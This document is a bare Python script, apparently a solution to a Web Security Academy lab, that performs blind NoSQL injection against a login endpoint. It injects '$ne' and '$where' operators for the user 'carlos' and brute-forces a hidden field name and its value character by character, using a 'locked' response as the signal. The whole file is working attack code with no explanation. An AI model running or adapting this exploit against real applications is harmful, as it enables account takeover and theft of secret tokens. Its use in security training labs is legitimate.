import requests
import urllib

base_domain = '0ab900a603038c0680c0eee600eb00c6.web-security-academy.net'

def send_request(data: dict) -> str:
    headers = {
        'Host': base_domain,
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
    response = requests.post(f'https://{base_domain}/login', json=data, headers=headers)
    return response.text

def check_if_key_char_matches(key_index: int, char_offset: int, char_to_test: str) -> bool:
    regex = '^.{' + str(char_offset) + '}' + char_to_test + '.*'
    data = {
        'username': 'carlos',
        'password': {'$ne': ''},
        '$where': f"Object.keys(this)[{key_index}].match('{regex}')"
    }
    response = send_request(data)
    return 'locked' in response

def check_if_value_char_matches(key_name: str, char_offset: int, char_to_test: str) -> bool:
    regex = '^.{' + str(char_offset) + '}' + char_to_test + '.*\$'
    data = {
        'username': 'carlos',
        'password': {'$ne': ''},
        '$where': f"this.{key_name}.match('{regex}')"
    }
    response = send_request(data)
    return 'locked' in response

key_index = 4
key_name = ''
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
max_key_length = 15
print(f'Brute forcing the key name at index {key_index}:')
for char_offset in range(max_key_length):
    found_match = False
    for char_to_test in alphabet:
        if check_if_key_char_matches(key_index, char_offset, char_to_test):
            print(f'   {key_name}')
            key_name += char_to_test
            found_match = True
            break
    if not found_match:
        break
print(f'\n{key_name = }')

max_value_length = 25
key_value = ''
print(f'Brute forcing the key value for {key_name}:')
for char_offset in range(max_value_length):
    found_match = False
    for char_to_test in alphabet:
        if check_if_value_char_matches(key_name, char_offset, char_to_test):
            print(f'   {key_value}')
            key_value += char_to_test
            found_match = True
            break
    if not found_match:
        break
print(f'\n{key_value = }')
